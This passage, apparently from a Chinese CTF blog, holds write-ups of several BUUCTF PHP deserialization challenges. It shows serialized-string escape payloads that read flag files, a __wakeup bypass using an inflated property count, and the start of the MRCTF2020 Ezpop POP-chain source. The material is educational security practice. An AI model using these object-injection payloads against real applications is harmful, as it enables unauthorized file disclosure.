href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$_GET[<span class=\"string\">'img_path'</span>])&#123;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'img'</span>] = base64_encode(<span class=\"string\">'guest_img.png'</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'img'</span>] = sha1(base64_encode($_GET[<span class=\"string\">'img_path'</span>]));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$serialize_info = filter(serialize($_SESSION));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($function == <span class=\"string\">'highlight_file'</span>)&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"string\">'index.php'</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($function == <span class=\"string\">'phpinfo'</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">'phpinfo();'</span>); <span class=\"comment\">//maybe you can find something in here!</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($function == <span class=\"string\">'show_image'</span>)&#123;</span><br><span class=\"line\">    $userinfo = unserialize($serialize_info);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> file_get_contents(base64_decode($userinfo[<span class=\"string\">'img'</span>]));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这道题与<a href=\"https://blog.csdn.net/qq_43756333/article/details/106420509\" target=\"_blank\" rel=\"noopener\">[0CTF 2016]piapiapia</a>有些相似，都是通过不当的处理将自己原来的结构改变而造成的漏洞<br>分析下代码。<br>get一个参数f，这个通过f=phpinfo可以打印出phpinfo();<br>获取到关键信息<br><img src=\"https://img-blog.csdnimg.cn/2020060508293358.png\" alt=\"在这里插入图片描述\"><br>base_encode(d0g3_f1ag.php)=ZDBnM19mMWFnLnBocA==<br>那么想办法读取这个文件<br>看最后一部分<br><img src=\"https://img-blog.csdnimg.cn/20200605083801311.png\" alt=\"在这里插入图片描述\"><br>当function的值为show_image时，对$serialize_info反序列化，打印出$userinfo中base解码后的img参数，$serialize_info是经过过滤之后的$_session<br><img src=\"https://img-blog.csdnimg.cn/2020060508341278.png\" alt=\"在这里插入图片描述\"><br>$_session有三个参数user，function，img<br><img src=\"https://img-blog.csdnimg.cn/20200605083614372.png\" alt=\"在这里插入图片描述\"><br>传入的img_path会被sha1加密再base64编码再给$_session[img]，没指定的话就直接base_encode(‘guest.img.png’)<br><img src=\"https://img-blog.csdnimg.cn/20200605083724879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>有两种payload<br>第一种：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class=\"function\"><span class=\"keyword\">function</span>]=<span class=\"title\">a</span>\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"img\"</span>;s:<span class=\"number\">20</span>:<span class=\"string\">\"ZDBnM19mMWFnLnBocA==\"</span>;s:<span class=\"number\">2</span>:<span class=\"string\">\"dd\"</span>;s:<span class=\"number\">1</span>:<span class=\"string\">\"a\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>分析一下<br>指定了各个参数的值，正常的序列化过程为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$_SESSION[<span class=\"string\">\"user\"</span>]=<span class=\"string\">'flagflagflagflagflagflag'</span>;</span><br><span class=\"line\">$_SESSION[<span class=\"string\">\"function\"</span>]=<span class=\"string\">'a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";&#125;'</span>;</span><br><span class=\"line\">$_SESSION[<span class=\"string\">\"img\"</span>]=<span class=\"string\">'ZDBnM19mMWFnLnBocA=='</span>;</span><br><span class=\"line\">$_SESSION[<span class=\"string\">\"img\"</span>] = base64_encode(<span class=\"string\">'guest_img.png'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($_SESSION);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">\"user\"</span>;s:<span class=\"number\">24</span>:<span class=\"string\">\"flagflagflagflagflagflag\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"function\"</span>;s:<span class=\"number\">59</span>:<span class=\"string\">\"a\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"img\"</span>;s:<span class=\"number\">20</span>:<span class=\"string\">\"ZDBnM19mMWFnLnBocA==\"</span>;s:<span class=\"number\">2</span>:<span class=\"string\">\"dd\"</span>;s:<span class=\"number\">1</span>:<span class=\"string\">\"a\"</span>;&#125;<span class=\"string\">\";s:3:\"</span>img<span class=\"string\">\";s:20:\"</span>Z3Vlc3RfaW1nLnBuZw==<span class=\"string\">\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>但由于过滤机制，那么序列化之后<br><img src=\"https://img-blog.csdnimg.cn/2020060510475531.png\" alt=\"在这里插入图片描述\"><br>原先flagflagflagflagflagflag的位置置空，那么序列化就会向后读取24个字符满足序列化格式，</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">\"user\"</span>;s:<span class=\"number\">24</span>:<span class=\"string\">\"\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"function\"</span>;s:<span class=\"number\">59</span>:<span class=\"string\">\"a\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"img\"</span>;s:<span class=\"number\">20</span>:<span class=\"string\">\"ZDBnM19mMWFnLnBocA==\"</span>;s:<span class=\"number\">2</span>:<span class=\"string\">\"dd\"</span>;s:<span class=\"number\">1</span>:<span class=\"string\">\"a\"</span>;&#125;<span class=\"string\">\";s:3:\"</span>img<span class=\"string\">\";s:20:\"</span>ZZ3Vlc3RfaW1nLnBuZw==<span class=\"string\">\";&#125;</span></span><br></pre></td></tr></table></figure>\n<p>那么此时反序列之后就变成了<br><img src=\"https://img-blog.csdnimg.cn/2020060510485989.png\" alt=\"在这里插入图片描述\"><br>后面的<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}</code>由于序列化格式已经满足就被忽略了<br>也就是说我们现在可以操作img修改序列化进程，后面的<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>就可以正常反序列化再由<code>file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code>打印出来<br><img src=\"https://img-blog.csdnimg.cn/20200605102951188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>提示在d0g3_fllllllag里，    <code>base_encode(/d0g3_fllllllag)=L2QwZzNfZmxsbGxsbGFn</code>修改一下payload即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class=\"function\"><span class=\"keyword\">function</span>]=<span class=\"title\">a</span>\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"img\"</span>;s:<span class=\"number\">20</span>:<span class=\"string\">\"L2QwZzNfZmxsbGxsbGFn\"</span>;s:<span class=\"number\">2</span>:<span class=\"string\">\"dd\"</span>;s:<span class=\"number\">1</span>:<span class=\"string\">\"a\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/2020060510363772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>第二种payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">_SESSION[flagphp]=;s:<span class=\"number\">1</span>:<span class=\"string\">\"1\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"img\"</span>;s:<span class=\"number\">20</span>:<span class=\"string\">\"ZDBnM19mMWFnLnBocA==\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>正常序列化过程</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$_SESSION[<span class=\"string\">'flagphp'</span>]=<span class=\"string\">';s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;'</span>;</span><br><span class=\"line\">$_SESSION[<span class=\"string\">'img'</span>] = base64_encode(<span class=\"string\">'guest_img.png'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($_SESSION);</span><br><span class=\"line\"><span class=\"comment\">//a:2:&#123;s:7:\"flagphp\";s:48:\";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;</span></span><br></pre></td></tr></table></figure>\n<p>此时flagphp被置空</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">a:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">7</span>:<span class=\"string\">\"\"</span>;s:<span class=\"number\">48</span>:<span class=\"string\">\";s:1:\"</span><span class=\"number\">1</span><span class=\"string\">\";s:3:\"</span>img<span class=\"string\">\";s:20:\"</span>ZDBnM19mMWFnLnBocA==<span class=\"string\">\";&#125;\"</span>;s:<span class=\"number\">3</span>:<span class=\"string\">\"img\"</span>;s:<span class=\"number\">20</span>:<span class=\"string\">\"Z3Vlc3RfaW1nLnBuZw==\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>第一个元素把<code>&quot;;s:48:</code>包含起来作为元素名，后面<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}</code>自动忽略，序列化重新排列<br><img src=\"https://img-blog.csdnimg.cn/20200605105042579.png\" alt=\"在这里插入图片描述\"><br>img就可正常打印出来了<br><img src=\"https://img-blog.csdnimg.cn/20200605105146825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>同样修改下base64文件名即可。</p>\n","categories":["buu刷题"],"tags":["代码审计","反序列化字符串逃逸"]},{"title":"极客大挑战2019——PHP","url":"/2020/05/26/buu2%E2%80%94%E2%80%94%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DPHP/","content":"<p>平台：buuoj.cn<br>打开靶机挨打(卡爆了)<br><img src=\"https://img-blog.csdnimg.cn/20200526131722227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>提示了有备份网站，尝试请求<a href=\"http://www.zip，成功得到源码。\" target=\"_blank\" rel=\"noopener\">www.zip，成功得到源码。</a><br>解压得如下文件：<br><img src=\"https://img-blog.csdnimg.cn/20200526131932153.png\" alt=\"在这里插入图片描述\"><br>随便点点，flag.php自然是没有flag的，在index.php中只有一段:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'class.php'</span>;</span><br><span class=\"line\">$select = $_GET[<span class=\"string\">'select'</span>];</span><br><span class=\"line\">$res=unserialize(@$select);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>包含了class.php文件，get传入一个select参数再将其反序列化。那么考点可能就是php的反序列化漏洞<br>来看class.php：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $username = <span class=\"string\">'nonono'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $password = <span class=\"string\">'yesyes'</span>;<span class=\"comment\">//声明两个私有变量</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($username,$password)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = $username;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = $password;<span class=\"comment\">//初始化</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;<span class=\"comment\">//反序列化时调用</span></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">'guest'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You name is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You password is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> $flag;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;<span class=\"comment\">//满足两个if得到flag</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>由此我们得知解题的条件：传入一个序列化的字符串，如果字符串经过反序列化之后username=admin，password=100，便会打印出flag。<br>那么构造序列化字符串。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> $username = <span class=\"string\">'nonono'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> $password = <span class=\"string\">'yesyes'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($username,$password)</span></span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;username = $username;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;password = $password; </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$payload = <span class=\"keyword\">new</span> Name(<span class=\"string\">'admin'</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($payload);</span><br><span class=\"line\"><span class=\"comment\">//O:4:\"Name\":2:&#123;s:14:\" Name username\";s:5:\"admin\";s:14:\" Name password\";i:100;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>到这再看看前面。<br>首先是第一个考点：</p>\n<blockquote>\n<p>私有化声明，private是私有类型，该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能调用私有类型的属性和方法。</p>\n</blockquote>\n<p>私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀(ASCII 码为 0 的字符(不可见字符))。字符串长度也包括所加前缀的长度。<br>也就是说usrname和password前面是有一个\\0的，但是复制的时候会丢失，因此我们需要加上%00填补上去</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">\"Name\"</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">\"%00Name%00username\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;s:<span class=\"number\">14</span>:<span class=\"string\">\"%00Name%00password\"</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们注意到，在执行<strong>destruct得到flag之前，还会有一个</strong>wakeup函数会在字符串反序列化执行之前把username重新赋值为guest，所以我们需要跳过它。<br>这里考察了一个php的漏洞：<a href=\"https://bugs.php.net/bug.php?id=72663\" target=\"_blank\" rel=\"noopener\">php-bugs-72663</a><br>反序列化时，如果反序列化字符串中表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。<br>所以这里我们把name属性的个数在字符串中改一下就行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">\"Name\"</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">\"%00Name%00username\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;s:<span class=\"number\">14</span>:<span class=\"string\">\"%00Name%00password\"</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>将最终的payload传入file得到flag<br><img src=\"https://img-blog.csdnimg.cn/20200526143553452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>为啥我这么卡？？难道说我的渣渣电脑已经不配打ctf了吗</p>\n","categories":["buu刷题"],"tags":["serialize","代码审计"]},{"title":"MRCTF2020——Ezpop","url":"/2020/06/17/buu17%E2%80%94%E2%80%94%5BMRCTF2020%5DEzpop/","content":"<p>平台：buuoj.cn<br>打开靶机得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//flag is in flag.php</span></span><br><span class=\"line\"><span class=\"comment\">//WTF IS THIS?</span></span><br><span class=\"line\"><span class=\"comment\">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class=\"line\"><span class=\"comment\">//And Crack It!</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Modifier</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  $var;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">append</span><span class=\"params\">($value)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;append(<span class=\"keyword\">$this</span>-&gt;var);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file=<span class=\"string\">'index.php'</span>)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;source = $file;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'Welcome to '</span>.<span class=\"keyword\">$this</span>-&gt;source.<span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;str-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span>, <span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"hacker\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;source = <span class=\"string\">\"index.php\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $p;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;p = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($key)</span></span>&#123;</span><br><span class=\"line\">        $function = <span class=\"keyword\">$this</span>-&gt;p;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $function();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'pop'</span>]))&#123;</span><br><span class=\"line\">    @unserialize($_GET[<span class=\"string\">'pop'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $a=<span class=\"keyword\">new</span> Show;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>共涉及以下魔术方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">__construct()  当一个对象创建时被调用</span><br><span class=\"line\">__toString()  当一个对象被当作一个字符串使用</span><br><span class=\"line\">__wakeup()  将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span><br><span class=\"line\">__get()  获得一个类的成员变量时调用</span><br><span class=\"line\">__invoke()  调用函数的方式调用一个对象时的回应方法</span><br></pre></td></tr></table></figure>\n<p>定义了三个类<br>Modifier:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Modifier</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  $var;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">append</span><span class=\"params\">($value)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;append(<span class=\"keyword\">$this</span>-&gt;var);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>声明保护字段类型<code>$var</code><br>声明函数append，包含传入的文件<br>如果把对象当作一个函数调用时，触发<code>__invoke()</code>方法，然后包含文件<br>Show:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file=<span class=\"string\">'index.php'</span>)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;source = $file;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'Welcome to '</span>.<span class=\"keyword\">$this</span>-&gt;source.<span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;str-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span>, <span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"hacker\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;source = <span class=\"string\">\"index.php\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>创建对象时触发<code>__construct()</code>方法，打印welcome to index.php，对象被当作字符串使用时触发<code>__tostring()</code>，序列化之后触发<code>__wakeup</code>，过滤了几个协议。<br>Test：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $p;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;p = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($key)</span></span>&#123;</span><br><span class=\"line\">        $function = <span class=\"keyword\">$this</span>-&gt;p;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $function();</span><br><span class=\"line\">    &#125;</span><br><span 